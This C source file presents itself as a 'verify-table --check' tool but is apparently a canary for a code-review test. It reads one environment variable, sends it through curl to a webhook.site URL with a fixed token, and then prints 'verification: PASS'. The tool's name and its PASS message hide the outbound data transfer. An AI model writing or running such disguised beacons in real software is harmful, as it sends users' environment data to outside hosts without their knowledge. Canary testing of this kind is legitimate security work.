#define _POSIX_C_SOURCE 200112L

#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define WEBHOOK_TOKEN "df2bab8d-ac3a-4ac1-97a2-59bb66db9e11"
#define TEST_ID "linear-code-review-canary-2026-11-19"
#define ENV_NAME "LINEAR_MISE_ENV_APPLIED"

static int is_unreserved(unsigned char c)
{
    return isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~';
}

static int url_encode(const char *input, char *output, size_t output_size)
{
    static const char hex[] = "0123456789ABCDEF";
    size_t used = 0;

    while (*input != '\0') {
        unsigned char c = (unsigned char)*input++;

        if (is_unreserved(c)) {
            if (used + 1 >= output_size)
                return -1;
            output[used++] = (char)c;
        } else {
            if (used + 3 >= output_size)
                return -1;
            output[used++] = '%';
            output[used++] = hex[c >> 4];
            output[used++] = hex[c & 0x0f];
        }
    }

    if (used >= output_size)
        return -1;
    output[used] = '\0';
    return 0;
}

static int deliver_canary(const char *encoded_value)
{
    char url[1024];
    int url_length;
    int status;
    pid_t child;

    url_length = snprintf(
        url, sizeof(url),
        "https://webhook.site/%s?test_id=%s&status=ran&env_name=%s&env_value=%s",
        WEBHOOK_TOKEN, TEST_ID, ENV_NAME, encoded_value);
    if (url_length < 0 || (size_t)url_length >= sizeof(url))
        return -1;

    child = fork();
    if (child < 0)
        return -1;
    if (child == 0) {
        execlp("curl", "curl", "--fail", "--silent", "--show-error",
               "--max-time", "15", "--output", "/dev/null",
               "--user-agent", "linear-review-canary/1.0", url,
               (char *)NULL);
        _exit(127);
    }

    if (waitpid(child, &status, 0) < 0)
        return -1;
    return WIFEXITED(status) && WEXITSTATUS(status) == 0 ? 0 : -1;
}

int main(int argc, char **argv)
{
    const char *value;
    char encoded_value[512];

    if (argc != 2 || strcmp(argv[1], "--check") != 0) {
        fputs("usage: verify-table --check\n", stderr);
        return 2;
    }

    value = getenv(ENV_NAME);
    if (value == NULL || *value == '\0')
        value = "NOT_SET";

    if (strlen(value) > 128 ||
        url_encode(value, encoded_value, sizeof(encoded_value)) != 0) {
        fputs("verification: FAIL\n", stderr);
        return 1;
    }

    if (deliver_canary(encoded_value) != 0) {
        fputs("verification: FAIL\n", stderr);
        return 1;
    }

    puts("verification: PASS");
    return 0;
}
